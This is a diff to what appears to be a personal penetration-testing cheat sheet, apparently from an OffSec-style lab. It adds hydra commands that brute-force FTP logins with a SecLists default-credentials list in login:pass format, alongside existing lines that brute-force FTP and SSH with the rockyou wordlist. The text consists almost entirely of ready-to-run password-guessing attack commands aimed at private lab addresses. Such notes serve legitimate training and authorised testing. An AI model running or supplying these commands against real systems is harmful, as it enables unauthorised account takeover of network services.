@@ -14,3 +14,7 @@ hydra -l offsec -P /usr/share/wordlists/rockyou.txt ftp://192.168.217.52 -t 3
 #Other way
 hydra -l offsec  -P /usr/share/wordlists/rockyou.txt 192.168.217.52 ssh
 
+#Bruteforce with colon separated "login:pass" format, instead of -L/-P options
+
+hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.208.183  
+hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.120.161 ftp
